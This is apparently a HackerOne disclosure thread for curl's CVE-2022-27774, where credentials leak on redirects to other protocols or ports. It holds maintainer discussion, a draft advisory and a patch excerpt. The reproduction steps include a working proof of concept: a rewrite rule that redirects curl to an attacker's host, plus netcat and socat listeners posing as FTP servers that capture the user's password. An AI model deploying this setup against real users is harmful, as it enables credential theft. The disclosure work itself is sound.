title: CVE-2022-27774: Credential leak on redirect

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool for doing internet transfers

vulnerability_information:
## Summary:
Curl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect to ftp:// URL.

## Steps To Reproduce:

  1. Configure for example Apache2 on `firstsite.tld` to perform redirect with mod_rewrite:
     ```
    RewriteCond %{HTTP_USER_AGENT} "^curl/"
    RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]
     ```
  2. Capture credentials at `secondsite.tld` for example with:
     ```
     while true; do echo -e "220 pocftp\n331 plz\n530 bye" | nc -v -l -p 9999; done
     ```
  3. `curl -L --user foo  https://firstsite.tld/redirectpoc`
  4. The entered password is visible in the fake FTP server:
```
Listening on 0.0.0.0 9999
Connection received on somehost someport
USER foo
PASS secretpassword
```

There are several issues here:
1. The credentials are sent to a completely different host than the original host (`firstsite.tld` vs `secondsite.tld`). This is definitely not what the user could expect, considering the documentation says:
> When authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.
2. The redirect crosses from secure context (HTTPS) to insecure one (FTP). That is the credentials are unexpectedly sent over insecure channels even when the URL specified is using HTTPS.

I believe the credentials should not be sent in this case unless if `--location-trusted` is used.

It might even be sensible to consider making curl stop sending credentials over downgraded security by default even when `--location-trusted` is used. Maybe there could be some option that could be used to enable such downgrade if the user REALLY wants it.

## Impact

Leak of confidential information (user credentials).

activities.message: Indeed just matching the same hostname would not be enough if the attacker can perform man in the middle attack. Downgrading HTTPS to FTP would ensure that the credentials would be visible in clear text to the MiTM attacker (attacker in active MiTM position could also spoof ftp server to ensure curl divulges the creds).

Of course this issue is limited to some specific scenarios where credentials are used to access a site. The attacker can then boobytrap locations in their control to leak the credentials to their own malicious FTP server. The victim would need to attempt to access the location trapped in this way, while also having redirect follow enabled.

Either way, curl is not working as documented, and credentials are leaked cross-domain even without `--location-trusted`. This clearly isn't the intended behaviour.

Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can!

I think an attack that requires an already existing successful MITM of a https connection is rather weak.

I think maybe a stronger case here is for a simple redirect from a credential protected page on `https://example.com` to `https://example.com:8443`. Voila: an accidental credential leak.
Or exactly how does the check fail?

> I think an attack that requires an already existing successful MITM

This is not required. The MiTM attack is just "proof of concept" to explain why comparing hostnames would not be enough to fix this.

The FTP attack doesn't require a MiTM (but of course the attacker needs to be able to add the redirect to begin with). Here the redirect can be forwarded to arbitrary host (it doesn't need to match the original host).

The vulnerability indeed also works by redirecting to http:// -- but in this case MiTM is required or the attacker need to be able to listen to arbitrary port on the host. This isn't as easily available as tuning for example .htaccess file or CGI.

I think `--location` should be restricted to same protocol and port, at least by default. These restrictions should only be lifted by `--location-trusted` (or optionally by some other option).
But indeed this attack won't work against arbitrary random HTTPS connections. The attacker must be able to create the redirect somehow, plus the victim needs to hit it.

To reiterate my main gripe is that `--location` gives a false sense of security due to this statement:

> When authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password.

Clearly the implementation and documentation don't meet here. Also `--location-trusted` seems to indicate that this should only ever happen if this option is used:
> Like -L, --location, but will allow sending the name + password to all hosts that the site may redirect to. This may or may not introduce a security breach if the site redirects you to a site to which you will send your authentication info (which is plaintext in the case of HTTP Basic authentication).

This is not the case currently as redirect to FTP will connect to any host.

I think it would make sense to restrict `--location` to send credentials only if host, protocol and port match that of the original request. Protocol "upgrade" could be allowed to any port (http -> https or ftps), since this doesn't make the credentials any more exposed than they already are anyway. (*)

 This default could then be relaxed optionally (`--location-trusted` or perhaps even more granular options?).

*) I think it is is somewhat questionable to send the same creds for different protocols to begin with, however. There's no obvious "correct" behaviour I can think of here.

This is not limited to FTP, is it? If you tell curl to allow redirects to other schemes it could leak to those as well, can't it?

I think my https redirect problem I mentioned is different but still a related problem. That can leak credentials between HTTPS instances on different port numbers using the same name, because the check doesn't include the port number.

> This is not limited to FTP, is it? If you tell curl to allow redirects to other schemes it could leak to those as well, can't it?

Out of the default `CURLOPT_REDIR_PROTOCOLS`:
- HTTP and HTTPS check for the hostname.
- FTP doesn't check for hostname. FTPS likely doesn't check for it either *but I haven't checked this*.

If `CURLOPT_REDIR_PROTOCOLS` is relaxed the problem likely gets wider, too. Hence my suggestion of the "easy" fix of not sending credentials cross-protocols...

Confirmed FTPS to also be vulnerable as expected.

HTTP "server":
```
while true; do echo -ne 'HTTP/1.1 301 Redirect\r\nLocation: ftps://secondhost:9999\r\nContent-Length: 0\r\n\r\n' | nc -v -l -p 9998; done
```

FTPS "server":
```
$ socat OPENSSL-LISTEN:9999,commonname=secondhost,reuseaddr,verify=0,fork,key=privkey.pem,cert=fullchain.pem STDIN
220 lol
USER user
331 plz
PASS secretpassword
```
Here's a (gzipped) test case 973 that seems to verify the redirect to FTP leak, although it redirects to the same name (IP address really).
Here's test 974 that shows the same issue when redirecting within the same scheme and host name but to a different port number.

Since we are just 8 days from release and it would be great to have this problem fixed in that release, I'm going to work on writing up a first advisory ASAP, get a CVE for this and get a first patch produced (all of that passed along here of course). So that I can alert distros@openwall about this within a few days. Then publish this on April 27 when the release ships.

additional_data.old_title: Credential leak via HTTP redirect to ftp://

activities.message:
Here's my first take on the advisory. This flaw is **old**. Also attached.

-----

Credential leak on redirect
===========================

Project curl Security Advisory, April 27th 2022 -
[Permalink](/docs/CVE-2022-27774.html)

VULNERABILITY
-------------

curl follows HTTP(S) redirects when asked to. curl also supports
authentication. When a user and password are provided for a URL with a given
hostname, curl makes an effort to not pass on those credentials to other hosts
in redirects unless given permission with a special option.

This "same host check" has been flawed all since it was introduced. It does
not work on cross protocol redirects and it does not consider different port
numbers to be separate hosts. This leads to curl leaking credentials to other
servers when it follows redirects from auth protected HTTP(S) URLs to other
protocols and port numbers.

By default, curl only allows redirects to HTTP(S) and FTP(S), but can be asked
to allow redirects to all protocols curl supports.

We are not aware of any exploit of this flaw.

INFO
----

This flaw was added in curl 4.9 with the introduction of `--location` and has
been present in all libcurl versions ever released. In July 2000 in the curl
7.1.1 release, [this
commit](https://github.com/curl/curl/commit/29eda80f9669f) was the first
version that attempted to avoid this, but the check has been bad since then.

The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2022-27774 to this issue.

CWE-522: Insufficiently Protected Credentials

Severity: Medium

AFFECTED VERSIONS
-----------------

- Affected versions: curl 4.9 to and including 7.82.0
- Not affected versions: curl < 4.9 and curl >= 7.83.0

Note that libcurl is used by many applications, but not always advertised as
such.

THE SOLUTION
------------

A [fix for CVE-2022-27774](https://curl.se/--not-yet--)

(This URL is for pre-announcement only)

RECOMMENDATIONS
---------------

We suggest you take one of the following actions immediately, in order of
preference:

 A - Upgrade curl and libcurl to version 7.83.0

 B - Apply the patch to your version and rebuild

 C - Switch off curl's automatic redirect following

TIME LINE
---------

It was first reported to the curl project on April 18 2022. We contacted
distros@openwall on April XX.

libcurl 7.83.0 was released on April 27 2022, coordinated with the
publication of this advisory.

CREDITS
-------

Reported by Harry Sintonen.

Thanks a lot!
There seem to be some rogue linefeeds ("this\ncommit"), but this is just formatting. The advisory content itself looks good already.
I'll fix that
Attached my first patch set (gzipped but CRLF issues might still occur). It contains 3 patches, one of which adds 4 new tests.

The patch is looking good to me in a sense I didn't see any obvious flaws in it.

I'm still wondering about the "upgrade" or "safe" use case however (for example security upgrade http -> https and http -> ftps or switching protocol from one secure protocol to another https -> ftps). These might be considered legitimate use cases that this patch now breaks.

The problem in enabling such "security upgrade" or "secure protocol to another secure protocol" is that it would require knowledge of if protocol is secure or not (I'm not sure if we have such information currently?).

Ultimately I'm not sure if adding such exceptions really is worth the trouble.

I don't think we should accept such redirects either without explicit permission. If this turns out to be a really important thing for someone, then I could possibly consider another option somewhere to allow exactly that kind of keeping the auth down the line. Until then I prefer to keep things as simple as possible. Or at least not complicated it further.
The full patch, latest version
Tested the patch with all my test cases and it works correctly now.

We may have missed a spot. I'm not sure but `CURLOPT_TLSAUTH_USERNAME` and `CURLOPT_TLSAUTH_PASSWORD` might be reused for redirects. I think these need to be wiped similar to regular username and password.

SRP is so rare I don't have obvious means to test this atm (even socat doesn't do it). So this is unconfirmed...

Hmm, a bit late to think about this but what if:  `curl -L --user user:secretpass https://firstsite.invalid/foo` -> redir301 `https://secondsite.invalid/bar` -> redir301 `https://firstsite.invalid/bleh` ... I guess the creds be sent to `firstsite.invalid` again? Are they with the current patch?
Good thinking. It is indeed also leaked. I'll do a second patch.

> Hmm, a bit late to think about this but what if

I think it might work partially, as the checks mostly prevent sending the data if there's no match. We can work on that as a regular bug going forward if we need to.

Just to give more headache: what about `CURLOPT_SSLCERT` / `--cert` ? In this case no "secret" is leaked, but the identify of the client certificate is. So this is a privacy leak, depending on what kind of information is in the client cert. This is clearly a minor issue of course, as obtaining the public certificate is useless for authentication alone.

Perhaps this is not as urgent as to need action right now.

> Perhaps this is not as urgent as to need action right now.

I think we can deal with that part outside of this issue.

~~~diff
diff --git a/docs/CVE-2022-27774.md b/docs/CVE-2022-27774.md
index cf7da84f..8c90298c 100644
--- a/docs/CVE-2022-27774.md
+++ b/docs/CVE-2022-27774.md
@@ -14,11 +14,12 @@ in redirects unless given permission with a special option.
 
 This "same host check" has been flawed all since it was introduced. It does
 not work on cross protocol redirects and it does not consider different port
 numbers to be separate hosts. This leads to curl leaking credentials to other
 servers when it follows redirects from auth protected HTTP(S) URLs to other
-protocols and port numbers.
+protocols and port numbers. It could also leak the TLS SRP credentials this
+way.
 
 By default, curl only allows redirects to HTTP(S) and FTP(S), but can be asked
 to allow redirects to all protocols curl supports.
 
 We are not aware of any exploit of this flaw.
Published. This issue is now eligible for a bounty claim from [IBB](https://hackerone.com/ibb).

Thanks for your work. The actual monetary reward part for this issue is managed by the [IBB](https://hackerone.com/ibb) so the curl project itself therefor sets the reward amount to **zero USD**. If you haven't already, please submit your reward request to them and refer back to this issue.
